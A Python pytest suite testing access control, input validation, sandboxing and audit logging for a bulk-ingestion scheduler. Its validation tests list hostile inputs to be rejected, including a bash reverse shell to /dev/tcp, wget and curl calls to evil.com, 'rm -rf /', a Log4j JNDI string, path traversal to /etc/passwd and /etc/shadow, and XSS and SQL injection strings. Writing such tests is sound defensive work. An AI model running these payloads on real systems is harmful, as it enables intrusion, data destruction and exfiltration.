#!/usr/bin/env python3
"""
Security tests for FR-002 scheduler access controls and security measures.

Tests comprehensive security aspects of the nightly bulk ingestion scheduler:
- Authentication and authorization for scheduler operations
- API security and access control enforcement  
- Job execution security and privilege separation
- Configuration security and sensitive data protection
- Audit logging and security monitoring
- Input validation and injection prevention
- Environment isolation security boundaries
- Resource access controls and sandboxing
"""

import pytest
import asyncio
import tempfile
import shutil
import os
import json
import time
import hashlib
import hmac
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from pathlib import Path
from typing import Dict, List, Optional, Any

# Test framework imports
from tests.conftest import BaseTestCase, TestEnvironment, MockPipeline
from src_common.logging import get_logger

# Import security and scheduler components (to be implemented)
try:
    from src_common.scheduler_engine import SchedulingEngine, CronParser
    from src_common.job_manager import JobManager, JobQueue, Job, JobStatus
    from src_common.scheduled_processor import ScheduledBulkProcessor
    from src_common.security_manager import SecurityManager, AuthenticationError, AuthorizationError
    from src_common.audit_logger import AuditLogger, SecurityEvent
    from src_common.access_control import AccessControlManager, Permission, Role
    from src_common.input_validator import InputValidator, ValidationError
except ImportError:
    # Mock imports for testing before implementation
    SchedulingEngine = Mock
    CronParser = Mock
    JobManager = Mock
    JobQueue = Mock
    Job = Mock
    JobStatus = Mock
    ScheduledBulkProcessor = Mock
    SecurityManager = Mock
    AuthenticationError = Exception
    AuthorizationError = Exception
    AuditLogger = Mock
    SecurityEvent = Mock
    AccessControlManager = Mock
    Permission = Mock
    Role = Mock
    InputValidator = Mock
    ValidationError = Exception

logger = get_logger(__name__)


class TestSchedulerSecurity(BaseTestCase):
    """Base class for scheduler security tests."""
    
    @pytest.fixture(autouse=True)
    def setup_security_testing_environment(self, temp_env_dir):
        """Set up security testing environment with test users and permissions."""
        self.env_dir = temp_env_dir
        self.artifacts_dir = self.env_dir / "artifacts" / "ingest" / "dev"
        self.config_dir = self.env_dir / "config"
        self.logs_dir = self.env_dir / "logs"
        
        # Create required directories
        self.artifacts_dir.mkdir(parents=True, exist_ok=True)
        self.config_dir.mkdir(parents=True, exist_ok=True)
        self.logs_dir.mkdir(parents=True, exist_ok=True)
        
        # Create security configuration
        self.security_config = {
            "authentication": {
                "method": "jwt",
                "secret_key": "test_secret_key_do_not_use_in_production",
                "token_expiry_minutes": 60,
                "require_2fa": False  # Simplified for testing
            },
            "authorization": {
                "method": "rbac",  # Role-Based Access Control
                "default_role": "viewer",
                "admin_users": ["admin@test.com"],
                "role_permissions": {
                    "viewer": ["scheduler:view", "jobs:view"],
                    "operator": ["scheduler:view", "jobs:view", "jobs:create", "jobs:cancel"],
                    "admin": ["*"]  # All permissions
                }
            },
            "audit_logging": {
                "enabled": True,
                "log_level": "INFO",
                "log_file": str(self.logs_dir / "security_audit.log"),
                "include_request_bodies": False,  # Security: don't log sensitive data
                "retention_days": 90
            },
            "api_security": {
                "rate_limiting": {
                    "enabled": True,
                    "requests_per_minute": 60,
                    "burst_limit": 10
                },
                "cors": {
                    "enabled": True,
                    "allowed_origins": ["http://localhost:3000"],  # Frontend only
                    "allowed_methods": ["GET", "POST", "PUT", "DELETE"]
                },
                "csrf_protection": True,
                "content_type_validation": True
            },
            "execution_security": {
                "sandbox_enabled": True,
                "resource_limits": {
                    "max_memory_mb": 1024,
                    "max_disk_usage_mb": 2048,
                    "max_execution_time_minutes": 60
                },
                "allowed_file_extensions": [".pdf"],
                "prohibited_paths": ["/etc", "/proc", "/sys"],
                "environment_isolation": True
            }
        }
        
        # Create test users with different roles
        self.test_users = {
            "admin@test.com": {
                "id": "user_001",
                "email": "admin@test.com",
                "role": "admin",
                "permissions": ["*"],
                "password_hash": self.hash_password("admin_password"),
                "active": True,
                "2fa_enabled": False
            },
            "operator@test.com": {
                "id": "user_002", 
                "email": "operator@test.com",
                "role": "operator",
                "permissions": ["scheduler:view", "jobs:view", "jobs:create", "jobs:cancel"],
                "password_hash": self.hash_password("operator_password"),
                "active": True,
                "2fa_enabled": False
            },
            "viewer@test.com": {
                "id": "user_003",
                "email": "viewer@test.com", 
                "role": "viewer",
                "permissions": ["scheduler:view", "jobs:view"],
                "password_hash": self.hash_password("viewer_password"),
                "active": True,
                "2fa_enabled": False
            },
            "inactive@test.com": {
                "id": "user_004",
                "email": "inactive@test.com",
                "role": "viewer", 
                "permissions": ["scheduler:view", "jobs:view"],
                "password_hash": self.hash_password("inactive_password"),
                "active": False,  # Inactive user for testing
                "2fa_enabled": False
            }
        }
        
        # Initialize security components
        self.security_manager = SecurityManager(config=self.security_config)
        self.access_control = AccessControlManager(config=self.security_config)
        self.audit_logger = AuditLogger(config=self.security_config["audit_logging"])
        self.input_validator = InputValidator(config=self.security_config)
    
    def hash_password(self, password: str) -> str:
        """Hash password for testing (simplified implementation)."""
        return hashlib.pbkdf2_hex(password.encode(), b"test_salt", 100000)
    
    def generate_jwt_token(self, user_email: str) -> str:
        """Generate JWT token for testing."""
        if user_email not in self.test_users:
            raise ValueError(f"Unknown test user: {user_email}")
        
        user = self.test_users[user_email]
        payload = {
            "user_id": user["id"],
            "email": user_email,
            "role": user["role"],
            "permissions": user["permissions"],
            "exp": int(time.time()) + 3600,  # 1 hour expiry
            "iat": int(time.time())
        }
        
        # Simplified JWT generation for testing
        import base64
        header = base64.b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode()
        payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode()
        signature = hmac.new(
            self.security_config["authentication"]["secret_key"].encode(),
            f"{header}.{payload_b64}".encode(),
            hashlib.sha256
        ).hexdigest()
        
        return f"{header}.{payload_b64}.{signature}"


class TestAuthenticationSecurity(TestSchedulerSecurity):
    """Test authentication mechanisms and security."""
    
    @pytest.mark.asyncio
    async def test_valid_authentication_with_jwt_tokens(self):
        """Test successful authentication with valid JWT tokens."""
        # Test authentication for different user roles
        for user_email in ["admin@test.com", "operator@test.com", "viewer@test.com"]:
            token = self.generate_jwt_token(user_email)
            
            # Authenticate with valid token
            auth_result = await self.security_manager.authenticate_token(token)
            
            assert auth_result["valid"] is True
            assert auth_result["user"]["email"] == user_email
            assert auth_result["user"]["role"] == self.test_users[user_email]["role"]
            assert set(auth_result["user"]["permissions"]) == set(self.test_users[user_email]["permissions"])
    
    @pytest.mark.asyncio
    async def test_invalid_authentication_scenarios(self):
        """Test authentication failures for various invalid scenarios."""
        invalid_scenarios = [
            {
                "name": "expired_token",
                "token": self.generate_expired_jwt_token("viewer@test.com"),
                "expected_error": "Token expired"
            },
            {
                "name": "malformed_token", 
                "token": "invalid.jwt.token",
                "expected_error": "Invalid token format"
            },
            {
                "name": "empty_token",
                "token": "",
                "expected_error": "No token provided"
            },
            {
                "name": "tampered_token",
                "token": self.generate_tampered_jwt_token("admin@test.com"),
                "expected_error": "Invalid signature"
            }
        ]
        
        for scenario in invalid_scenarios:
            with pytest.raises(AuthenticationError) as exc_info:
                await self.security_manager.authenticate_token(scenario["token"])
            
            assert scenario["expected_error"] in str(exc_info.value)
    
    @pytest.mark.asyncio
    async def test_inactive_user_authentication_blocked(self):
        """Test that inactive users cannot authenticate."""
        # Generate token for inactive user
        token = self.generate_jwt_token("inactive@test.com")
        
        with pytest.raises(AuthenticationError) as exc_info:
            await self.security_manager.authenticate_token(token)
        
        assert "User account is inactive" in str(exc_info.value)
    
    def generate_expired_jwt_token(self, user_email: str) -> str:
        """Generate expired JWT token for testing."""
        user = self.test_users[user_email]
        payload = {
            "user_id": user["id"],
            "email": user_email,
            "role": user["role"],
            "permissions": user["permissions"],
            "exp": int(time.time()) - 3600,  # Expired 1 hour ago
            "iat": int(time.time()) - 7200   # Issued 2 hours ago
        }
        
        import base64
        header = base64.b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode()
        payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode()
        signature = hmac.new(
            self.security_config["authentication"]["secret_key"].encode(),
            f"{header}.{payload_b64}".encode(),
            hashlib.sha256
        ).hexdigest()
        
        return f"{header}.{payload_b64}.{signature}"
    
    def generate_tampered_jwt_token(self, user_email: str) -> str:
        """Generate JWT token with tampered signature for testing."""
        valid_token = self.generate_jwt_token(user_email)
        parts = valid_token.split(".")
        
        # Tamper with signature
        tampered_signature = "tampered_signature_123456789"
        return f"{parts[0]}.{parts[1]}.{tampered_signature}"


class TestAuthorizationSecurity(TestSchedulerSecurity):
    """Test authorization and access control mechanisms."""
    
    @pytest.mark.asyncio
    async def test_role_based_access_control_enforcement(self):
        """Test that users can only access resources based on their roles."""
        test_operations = [
            {"operation": "scheduler:view", "description": "View scheduler status"},
            {"operation": "jobs:view", "description": "View job details"},
            {"operation": "jobs:create", "description": "Create new jobs"},
            {"operation": "jobs:cancel", "description": "Cancel running jobs"},
            {"operation": "jobs:delete", "description": "Delete job history"},
            {"operation": "scheduler:config", "description": "Modify scheduler configuration"},
            {"operation": "users:manage", "description": "Manage user accounts"}
        ]
        
        expected_access = {
            "admin": ["*"],  # Admin has access to everything
            "operator": ["scheduler:view", "jobs:view", "jobs:create", "jobs:cancel"],
            "viewer": ["scheduler:view", "jobs:view"]
        }
        
        for user_email in ["admin@test.com", "operator@test.com", "viewer@test.com"]:
            user = self.test_users[user_email]
            role = user["role"]
            
            for operation in test_operations:
                op_name = operation["operation"]
                
                # Check if user should have access
                should_have_access = (
                    "*" in expected_access[role] or 
                    op_name in expected_access[role]
                )
                
                # Test access control
                has_access = await self.access_control.check_permission(
                    user_id=user["id"],
                    permission=op_name,
                    context={"operation": operation["description"]}
                )
                
                assert has_access == should_have_access, \
                    f"User {user_email} ({role}) access to {op_name} should be {should_have_access}, got {has_access}"
    
    @pytest.mark.asyncio
    async def test_scheduler_api_access_control(self):
        """Test access control for scheduler API endpoints."""
        # Simulate API endpoints and required permissions
        api_endpoints = [
            {"method": "GET", "path": "/scheduler/status", "permission": "scheduler:view"},
            {"method": "POST", "path": "/scheduler/start", "permission": "scheduler:control"},
            {"method": "POST", "path": "/scheduler/stop", "permission": "scheduler:control"}, 
            {"method": "GET", "path": "/jobs", "permission": "jobs:view"},
            {"method": "POST", "path": "/jobs", "permission": "jobs:create"},
            {"method": "DELETE", "path": "/jobs/{job_id}", "permission": "jobs:delete"},
            {"method": "PUT", "path": "/scheduler/config", "permission": "scheduler:config"}
        ]
        
        # Test each user's access to each endpoint
        for user_email in self.test_users:
            if not self.test_users[user_email]["active"]:
                continue  # Skip inactive users
                
            token = self.generate_jwt_token(user_email)
            user = self.test_users[user_email]
            role = user["role"]
            
            for endpoint in api_endpoints:
                # Check if user should have access
                required_permission = endpoint["permission"]
                should_have_access = (
                    "*" in user["permissions"] or
                    required_permission in user["permissions"]
                )
                
                # Simulate API request with authorization
                api_request = {
                    "method": endpoint["method"],
                    "path": endpoint["path"],
                    "headers": {"Authorization": f"Bearer {token}"},
                    "user": user
                }
                
                try:
                    access_result = await self.access_control.authorize_api_request(api_request)
                    has_access = access_result["authorized"]
                except AuthorizationError:
                    has_access = False
                
                assert has_access == should_have_access, \
                    f"User {user_email} ({role}) access to {endpoint['method']} {endpoint['path']} should be {should_have_access}"
    
    @pytest.mark.asyncio
    async def test_job_execution_authorization(self):
        """Test authorization for job creation and execution."""
        scheduler = SchedulingEngine(config=self.security_config)
        job_manager = JobManager(
            config=self.security_config,
            pipeline=self.create_mock_pipeline(),
            security_manager=self.security_manager
        )
        
        # Test job creation with different user permissions
        test_cases = [
            {
                "user": "admin@test.com",
                "should_succeed": True,
                "reason": "Admin has all permissions"
            },
            {
                "user": "operator@test.com", 
                "should_succeed": True,
                "reason": "Operator has jobs:create permission"
            },
            {
                "user": "viewer@test.com",
                "should_succeed": False,
                "reason": "Viewer only has view permissions"
            }
        ]
        
        for case in test_cases:
            user_email = case["user"]
            token = self.generate_jwt_token(user_email)
            
            try:
                job_id = await job_manager.create_job_with_auth(
                    name=f"auth_test_job_{user_email}",
                    job_type="bulk_ingestion",
                    source_path="/test/path/document.pdf",
                    environment="dev",
                    priority=1,
                    auth_token=token
                )
                
                # If we get here, job creation succeeded
                assert case["should_succeed"], f"Job creation should have failed for {user_email}: {case['reason']}"
                assert job_id is not None
                
            except AuthorizationError as e:
                # Job creation failed due to authorization
                assert not case["should_succeed"], f"Job creation should have succeeded for {user_email}: {case['reason']}"
                assert "permission" in str(e).lower() or "authorization" in str(e).lower()


class TestInputValidationSecurity(TestSchedulerSecurity):
    """Test input validation and injection prevention."""
    
    @pytest.mark.asyncio
    async def test_cron_expression_validation_and_injection_prevention(self):
        """Test validation of cron expressions to prevent injection attacks."""
        scheduler = SchedulingEngine(config=self.security_config)
        
        # Valid cron expressions
        valid_cron_expressions = [
            "0 2 * * *",           # Daily at 2 AM
            "*/15 * * * *",        # Every 15 minutes
            "0 0 1 * *",           # First day of every month
            "0 9-17 * * 1-5",      # Business hours, weekdays
            "30 1 * * 0"           # Sunday at 1:30 AM
        ]
        
        for cron_expr in valid_cron_expressions:
            validation_result = self.input_validator.validate_cron_expression(cron_expr)
            assert validation_result["valid"] is True
            assert len(validation_result["errors"]) == 0
        
        # Invalid/malicious cron expressions
        malicious_cron_expressions = [
            "; rm -rf /",                    # Command injection attempt
            "* * * * * && wget evil.com",   # Command chaining
            "$(curl malicious.com)",        # Command substitution
            "`id`",                         # Command substitution (backticks)
            "../../../etc/passwd",          # Path traversal
            "<script>alert('xss')</script>", # XSS attempt
            "' OR 1=1--",                   # SQL injection pattern
            "\\x41\\x42\\x43",             # Hex encoding bypass attempt
            "0 2 * * * | mail hacker@evil.com", # Pipe to external command
            "0 2 * * *; /bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" # Reverse shell
        ]
        
        for malicious_expr in malicious_cron_expressions:
            with pytest.raises(ValidationError) as exc_info:
                self.input_validator.validate_cron_expression(malicious_expr)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in 
                      ["invalid", "malicious", "forbidden", "injection", "security"])
    
    @pytest.mark.asyncio
    async def test_file_path_validation_and_traversal_prevention(self):
        """Test file path validation to prevent directory traversal attacks."""
        job_manager = JobManager(
            config=self.security_config,
            pipeline=self.create_mock_pipeline(),
            security_manager=self.security_manager
        )
        
        # Valid file paths
        valid_paths = [
            "/uploads/document.pdf",
            "/data/files/test_document.pdf",
            "./relative/path/file.pdf",
            "simple_filename.pdf"
        ]
        
        for valid_path in valid_paths:
            validation_result = self.input_validator.validate_file_path(valid_path)
            assert validation_result["valid"] is True
            assert validation_result["sanitized_path"] is not None
        
        # Malicious file paths
        malicious_paths = [
            "../../../etc/passwd",           # Directory traversal
            "..\\..\\..\\windows\\system32", # Windows directory traversal
            "/proc/self/environ",            # Accessing process environment
            "\\\\server\\share\\file.pdf",   # UNC path
            "/dev/null",                     # Device file
            "CON:",                          # Windows reserved name
            "file.pdf%00.txt",               # Null byte injection
            "file.pdf\x00.txt",              # Null byte (hex)
            "/var/log/../../etc/shadow",     # Traversal with valid prefix
            "uploads/../config/.env"         # Relative traversal to config
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises(ValidationError) as exc_info:
                self.input_validator.validate_file_path(malicious_path)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in 
                      ["invalid", "traversal", "forbidden", "security", "restricted"])
    
    @pytest.mark.asyncio
    async def test_job_name_validation_and_xss_prevention(self):
        """Test job name validation to prevent XSS and other injection attacks."""
        job_manager = JobManager(
            config=self.security_config,
            pipeline=self.create_mock_pipeline(),
            security_manager=self.security_manager
        )
        
        # Valid job names
        valid_names = [
            "nightly_ingestion_job",
            "Document Processing - Daily",
            "Test Job #123",
            "Process_2025-01-15",
            "job-with-dashes",
            "Job with Spaces"
        ]
        
        for valid_name in valid_names:
            validation_result = self.input_validator.validate_job_name(valid_name)
            assert validation_result["valid"] is True
            assert validation_result["sanitized_name"] is not None
        
        # Malicious job names
        malicious_names = [
            "<script>alert('xss')</script>",        # XSS script tag
            "javascript:alert('xss')",              # JavaScript protocol
            "onload='alert(\"xss\")'",              # Event handler
            "${jndi:ldap://evil.com/a}",            # Log4j injection
            "{{7*7}}",                              # Template injection
            "'; DROP TABLE jobs; --",               # SQL injection
            "<img src=x onerror=alert('xss')>",     # Image XSS
            "&lt;script&gt;alert('xss')&lt;/script&gt;", # HTML entity encoded XSS
            "data:text/html,<script>alert('xss')</script>", # Data URI XSS
            "\"><script>alert('xss')</script>"      # Attribute breaking XSS
        ]
        
        for malicious_name in malicious_names:
            with pytest.raises(ValidationError) as exc_info:
                self.input_validator.validate_job_name(malicious_name)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in 
                      ["invalid", "malicious", "forbidden", "xss", "injection", "security"])


class TestExecutionSecurity(TestSchedulerSecurity):
    """Test job execution security and sandboxing."""
    
    @pytest.mark.asyncio
    async def test_job_execution_sandboxing(self):
        """Test that jobs execute in a secure sandbox environment."""
        processor = ScheduledBulkProcessor(
            config=self.security_config,
            pipeline=self.create_mock_pipeline(),
            security_manager=self.security_manager
        )
        
        # Mock sandbox enforcement
        sandbox_constraints = []
        
        def mock_sandbox_execution(*args, **kwargs):
            # Record sandbox constraints being applied
            constraints = kwargs.get("sandbox_constraints", {})
            sandbox_constraints.append(constraints)
            
            # Verify expected security constraints
            expected_constraints = {
                "max_memory_mb": self.security_config["execution_security"]["resource_limits"]["max_memory_mb"],
                "max_disk_usage_mb": self.security_config["execution_security"]["resource_limits"]["max_disk_usage_mb"],
                "max_execution_time_minutes": self.security_config["execution_security"]["resource_limits"]["max_execution_time_minutes"],
                "prohibited_paths": self.security_config["execution_security"]["prohibited_paths"],
                "allowed_extensions": self.security_config["execution_security"]["allowed_file_extensions"]
            }
            
            for key, expected_value in expected_constraints.items():
                assert constraints.get(key) == expected_value
            
            return {
                "job_id": "sandbox_test_job",
                "status": "completed",
                "sandbox_applied": True,
                "resource_usage": {
                    "memory_peak_mb": 256,
                    "disk_used_mb": 100,
                    "execution_time_seconds": 45
                }
            }
        
        processor.pipeline.process_source.side_effect = mock_sandbox_execution
        
        # Create test job with potential security risks
        test_job = Job(
            id="sandbox_security_test",
            name="Sandbox Security Test",
            job_type="bulk_ingestion",
            source_path="/test/uploads/test_document.pdf",
            environment="dev",
            priority=1,
            created_at=datetime.now(),
            status=JobStatus.PENDING
        )
        
        # Execute job with sandbox enforcement
        result = await processor.execute_job(test_job)
        
        # Verify sandbox was applied
        assert len(sandbox_constraints) == 1
        assert result["sandbox_applied"] is True
        assert result["status"] == "completed"
    
    @pytest.mark.asyncio
    async def test_resource_limit_enforcement(self):
        """Test enforcement of resource limits during job execution."""
        processor = ScheduledBulkProcessor(
            config=self.security_config,
            pipeline=self.create_mock_pipeline(),
            security_manager=self.security_manager
        )
        
        # Test cases for different resource violations
        resource_violations = [
            {
                "name": "memory_exceeded",
                "resource_usage": {"memory_peak_mb": 2048},  # Exceeds 1024 MB limit
                "expected_action": "terminate",
                "expected_reason": "Memory limit exceeded"
            },
            {
                "name": "disk_exceeded", 
                "resource_usage": {"disk_used_mb": 3072},    # Exceeds 2048 MB limit
                "expected_action": "terminate",
                "expected_reason": "Disk usage limit exceeded"
            },
            {
                "name": "time_exceeded",
                "resource_usage": {"execution_time_seconds": 4000}, # Exceeds 3600s (60min) limit
                "expected_action": "terminate", 
                "expected_reason": "Execution time limit exceeded"
            }
        ]
        
        for violation in resource_violations:
            def mock_resource_violation(*args, **kwargs):
                # Simulate resource violation during execution
                raise ResourceLimitError(
                    violation["expected_reason"],
                    resource_usage=violation["resource_usage"]
                )
            
            processor.pipeline.process_source.side_effect = mock_resource_violation
            
            test_job = Job(
                id=f"resource_test_{violation['name']}",
                name=f"Resource Limit Test - {violation['name']}",
                job_type="bulk_ingestion",
                source_path="/test/uploads/test_document.pdf",
                environment="dev",
                priority=1,
                created_at=datetime.now(),
                status=JobStatus.PENDING
            )
            
            # Execute job - should be terminated due to resource violation
            result = await processor.execute_job(test_job)
            
            assert result["status"] == "failed"
            assert violation["expected_reason"] in result["error_message"]
            assert result["termination_reason"] == violation["expected_action"]
    
    @pytest.mark.asyncio
    async def test_file_access_restrictions(self):
        """Test that jobs cannot access restricted files and directories."""
        processor = ScheduledBulkProcessor(
            config=self.security_config,
            pipeline=self.create_mock_pipeline(),
            security_manager=self.security_manager
        )
        
        # Prohibited paths from security config
        prohibited_paths = self.security_config["execution_security"]["prohibited_paths"]
        
        # Test file access attempts
        file_access_attempts = []
        
        def mock_file_access_monitoring(*args, **kwargs):
            # Monitor file access attempts during job execution
            source_path = kwargs.get("source_path", "")
            
            # Check if attempting to access prohibited paths
            for prohibited_path in prohibited_paths:
                if prohibited_path in source_path:
                    file_access_attempts.append({
                        "path": source_path,
                        "prohibited": True,
                        "reason": f"Access to {prohibited_path} is prohibited"
                    })
                    raise SecurityError(f"Access denied: {prohibited_path} is a restricted path")
            
            file_access_attempts.append({
                "path": source_path,
                "prohibited": False,
                "allowed": True
            })
            
            return {
                "job_id": "file_access_test",
                "status": "completed",
                "files_accessed": [source_path]
            }
        
        processor.pipeline.process_source.side_effect = mock_file_access_monitoring
        
        # Test allowed file access
        allowed_job = Job(
            id="allowed_file_access_test",
            name="Allowed File Access Test",
            job_type="bulk_ingestion",
            source_path="/uploads/allowed_document.pdf",
            environment="dev",
            priority=1,
            created_at=datetime.now(),
            status=JobStatus.PENDING
        )
        
        result = await processor.execute_job(allowed_job)
        assert result["status"] == "completed"
        
        # Test prohibited file access
        for prohibited_path in prohibited_paths:
            prohibited_job = Job(
                id=f"prohibited_access_test_{prohibited_path.replace('/', '_')}",
                name="Prohibited File Access Test",
                job_type="bulk_ingestion", 
                source_path=f"{prohibited_path}/sensitive_file.pdf",
                environment="dev",
                priority=1,
                created_at=datetime.now(),
                status=JobStatus.PENDING
            )
            
            result = await processor.execute_job(prohibited_job)
            assert result["status"] == "failed"
            assert "access denied" in result["error_message"].lower()
            assert "restricted" in result["error_message"].lower()


class TestAuditLoggingSecurity(TestSchedulerSecurity):
    """Test security audit logging and monitoring."""
    
    @pytest.mark.asyncio
    async def test_comprehensive_security_event_logging(self):
        """Test that all security-relevant events are properly logged."""
        # Clear existing audit logs
        if os.path.exists(self.audit_logger.log_file):
            os.remove(self.audit_logger.log_file)
        
        # Security events to test
        security_events = [
            {
                "type": "authentication_success",
                "user": "admin@test.com",
                "details": {"token_issued": True, "login_method": "jwt"}
            },
            {
                "type": "authentication_failure", 
                "user": "unknown@test.com",
                "details": {"reason": "Invalid credentials", "ip_address": "192.168.1.100"}
            },
            {
                "type": "authorization_denied",
                "user": "viewer@test.com",
                "details": {"requested_action": "jobs:delete", "resource": "job_123"}
            },
            {
                "type": "job_created",
                "user": "operator@test.com", 
                "details": {"job_id": "job_456", "job_type": "bulk_ingestion"}
            },
            {
                "type": "configuration_changed",
                "user": "admin@test.com",
                "details": {"setting": "max_concurrent_jobs", "old_value": 4, "new_value": 8}
            },
            {
                "type": "security_violation",
                "user": "viewer@test.com",
                "details": {"violation_type": "file_access", "attempted_path": "/etc/passwd"}
            }
        ]
        
        # Log each security event
        for event in security_events:
            await self.audit_logger.log_security_event(
                event_type=event["type"],
                user=event["user"],
                details=event["details"],
                timestamp=datetime.now(),
                ip_address="127.0.0.1",
                user_agent="test_client/1.0"
            )
        
        # Read and verify audit log entries
        audit_logs = self.audit_logger.read_security_logs(
            start_time=datetime.now() - timedelta(minutes=5),
            end_time=datetime.now() + timedelta(minutes=1)
        )
        
        assert len(audit_logs) == len(security_events)
        
        # Verify each logged event contains required security information
        for i, log_entry in enumerate(audit_logs):
            expected_event = security_events[i]
            
            assert log_entry["event_type"] == expected_event["type"]
            assert log_entry["user"] == expected_event["user"]
            assert log_entry["timestamp"] is not None
            assert log_entry["ip_address"] == "127.0.0.1"
            assert log_entry["user_agent"] == "test_client/1.0"
            
            # Verify sensitive details are properly logged
            for key, value in expected_event["details"].items():
                assert log_entry["details"][key] == value
    
    @pytest.mark.asyncio
    async def test_sensitive_data_protection_in_logs(self):
        """Test that sensitive data is not logged or is properly redacted."""
        # Test authentication attempt with password (should be redacted)
        await self.audit_logger.log_security_event(
            event_type="authentication_attempt",
            user="test@test.com",
            details={
                "password": "secret_password_123",  # Should be redacted
                "token": "jwt.token.signature",     # Should be redacted
                "api_key": "sk-1234567890abcdef",   # Should be redacted
                "database_url": "postgresql://user:pass@host:5432/db", # Should be redacted
                "allowed_field": "public_information"  # Should NOT be redacted
            },
            timestamp=datetime.now(),
            ip_address="127.0.0.1"
        )
        
        # Read the audit log
        audit_logs = self.audit_logger.read_security_logs(
            start_time=datetime.now() - timedelta(minutes=1),
            end_time=datetime.now() + timedelta(minutes=1)
        )
        
        assert len(audit_logs) >= 1
        log_entry = audit_logs[-1]  # Get the most recent entry
        
        # Verify sensitive data is redacted
        assert log_entry["details"]["password"] == "[REDACTED]"
        assert log_entry["details"]["token"] == "[REDACTED]" 
        assert log_entry["details"]["api_key"] == "[REDACTED]"
        assert log_entry["details"]["database_url"] == "[REDACTED]"
        
        # Verify non-sensitive data is preserved
        assert log_entry["details"]["allowed_field"] == "public_information"
    
    @pytest.mark.asyncio
    async def test_audit_log_integrity_and_tampering_detection(self):
        """Test that audit logs have integrity protection and tampering detection."""
        # Generate audit log entries with integrity hashes
        audit_entries = []
        for i in range(5):
            entry = {
                "event_type": "test_event",
                "user": f"user_{i}@test.com",
                "details": {"test_data": f"value_{i}"},
                "timestamp": datetime.now(),
                "ip_address": "127.0.0.1"
            }
            
            # Log with integrity protection
            logged_entry = await self.audit_logger.log_security_event_with_integrity(**entry)
            audit_entries.append(logged_entry)
        
        # Verify integrity hashes are present and valid
        for entry in audit_entries:
            assert "integrity_hash" in entry
            assert entry["integrity_hash"] is not None
            assert len(entry["integrity_hash"]) > 0
            
            # Verify hash can be validated
            is_valid = self.audit_logger.verify_entry_integrity(entry)
            assert is_valid is True
        
        # Test tampering detection
        tampered_entry = audit_entries[0].copy()
        tampered_entry["details"]["test_data"] = "tampered_value"
        
        # Verify tampering is detected
        is_valid_after_tampering = self.audit_logger.verify_entry_integrity(tampered_entry)
        assert is_valid_after_tampering is False
        
        # Test audit log chain integrity
        chain_integrity = self.audit_logger.verify_audit_log_chain(audit_entries)
        assert chain_integrity["valid"] is True
        assert chain_integrity["tampered_entries"] == 0
    
    @pytest.mark.asyncio
    async def test_security_alerting_on_suspicious_activity(self):
        """Test that security alerts are triggered for suspicious activity patterns."""
        # Configure security alerting thresholds
        alert_config = {
            "failed_authentication_threshold": 3,
            "time_window_minutes": 5,
            "suspicious_patterns": [
                "multiple_failed_logins",
                "privilege_escalation_attempt",
                "unusual_file_access",
                "rapid_api_requests"
            ]
        }
        
        self.audit_logger.configure_security_alerting(alert_config)
        
        # Test multiple failed authentication attempts
        user_ip = "192.168.1.100"
        for i in range(4):  # Exceed threshold of 3
            await self.audit_logger.log_security_event(
                event_type="authentication_failure",
                user=f"attacker_{i}@test.com",
                details={
                    "reason": "Invalid password",
                    "ip_address": user_ip,
                    "attempt_number": i + 1
                },
                timestamp=datetime.now(),
                ip_address=user_ip
            )
        
        # Check if security alert was triggered
        security_alerts = self.audit_logger.get_security_alerts(
            time_window_minutes=5
        )
        
        assert len(security_alerts) >= 1
        
        # Verify alert details
        failed_login_alert = next(
            (alert for alert in security_alerts 
             if alert["pattern"] == "multiple_failed_logins"), 
            None
        )
        
        assert failed_login_alert is not None
        assert failed_login_alert["severity"] == "HIGH"
        assert failed_login_alert["source_ip"] == user_ip
        assert failed_login_alert["event_count"] >= 4
        assert "authentication_failure" in failed_login_alert["description"]


# Custom exceptions for testing
class ResourceLimitError(Exception):
    def __init__(self, message, resource_usage=None):
        super().__init__(message)
        self.resource_usage = resource_usage or {}


class SecurityError(Exception):
    pass


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])